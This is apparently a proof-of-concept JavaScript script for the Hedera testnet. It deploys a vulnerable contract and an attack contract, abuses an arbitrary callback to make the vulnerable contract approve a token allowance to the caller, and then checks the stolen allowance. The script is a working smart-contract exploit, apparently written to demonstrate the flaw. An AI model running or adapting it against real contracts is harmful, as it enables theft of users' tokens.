const { Client, AccountBalanceQuery, ContractFunctionParameters, ContractExecuteTransaction, AccountId, ContractCreateFlow, ContractCallQuery } = require("@hashgraph/sdk");
const { ethers } = require("hardhat");

require("dotenv").config();

async function main() {
    const myAccountId = process.env.MY_ACCOUNT_ID;
    const myPrivateKey = process.env.MY_PRIVATE_KEY;

    const client = Client.forTestnet();
    client.setOperator(myAccountId, myPrivateKey);

    const TOKEN_ID = "0.0.5774"; // can be any hts token
    const TOKEN_EVM_ADDRESS = `0x${AccountId.fromString(TOKEN_ID).toSolidityAddress()}`;
    const MY_ACCOUNT_EVM_ADDRESS = `0x${AccountId.fromString(myAccountId).toSolidityAddress()}`

    // deploy vulnerable contract
    var VULNERABLE_CONTRACT_ID;
    {
        const factory = await ethers.getContractFactory("VulnerableContract");
        const bytecode = factory.bytecode;
        const contractCreate = new ContractCreateFlow()
            .setGas(1000000)
            .setBytecode(bytecode);
        const txResponse = contractCreate.execute(client);
        const receipt = (await txResponse).getReceipt(client);
        const contractId = (await receipt).contractId;
        VULNERABLE_CONTRACT_ID = contractId.toString();
    }
    console.log("Deployed vuln contract: ", VULNERABLE_CONTRACT_ID);
    const VULNERABLE_CONTRACT_EVM_ADDRESS = `0x${AccountId.fromString(VULNERABLE_CONTRACT_ID).toSolidityAddress()}`;

    // associate an hts token to the contract
    var ASSOCIATE_TX_STATUS;
    {
        const transaction = new ContractExecuteTransaction()
            .setContractId(VULNERABLE_CONTRACT_ID)
            .setGas(800_000)
            .setFunction("associateToken", new ContractFunctionParameters()
                .addAddress(TOKEN_EVM_ADDRESS)
            )
        const txResponse = await transaction.execute(client);
        const receipt = await txResponse.getReceipt(client);
        ASSOCIATE_TX_STATUS = receipt.status.toString();
    }
    console.log("Try associate token to vulnerable contract: ", ASSOCIATE_TX_STATUS);

    // deploy attack contract
    var ATTACK_CONTRACT_ID;
    {
        const factory = await ethers.getContractFactory("AttackContract");
        const bytecode = factory.bytecode;
        const contractCreate = new ContractCreateFlow()
            .setGas(1000000)
            .setBytecode(bytecode);
        const txResponse = contractCreate.execute(client);
        const receipt = (await txResponse).getReceipt(client);
        const contractId = (await receipt).contractId;
        ATTACK_CONTRACT_ID = contractId.toString();
    }
    console.log("Deployed attack contract: ", ATTACK_CONTRACT_ID);
    const ATTACK_CONTRACT_EVM_ADDRESS = `0x${AccountId.fromString(ATTACK_CONTRACT_ID).toSolidityAddress()}`;

    // maliciously approve tokens of the vulnerable contract
    var CALLBACK_TX_STATUS;
    {
        const transaction = new ContractExecuteTransaction()
            .setContractId(VULNERABLE_CONTRACT_ID)
            .setGas(1_000_000)
            .setFunction("arbitraryCallback", new ContractFunctionParameters()
                .addAddress(ATTACK_CONTRACT_EVM_ADDRESS)
            )
        const txResponse = await transaction.execute(client);
        const receipt = await txResponse.getReceipt(client);
        CALLBACK_TX_STATUS = receipt.status.toString();
    }
    console.log("Try callback approve hack: ", CALLBACK_TX_STATUS);


    // check allowance
    {
        const query = new ContractCallQuery()
            .setContractId(TOKEN_ID)
            .setGas(60000)
            .setFunction("allowance", new ContractFunctionParameters()
                .addAddress(VULNERABLE_CONTRACT_EVM_ADDRESS)
                .addAddress(MY_ACCOUNT_EVM_ADDRESS)
            )
        const contractCallResult = await query.execute(client);
        const message = contractCallResult.getUint256(0);
        console.log("Malicious allowance amount: ", message.toString());
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });

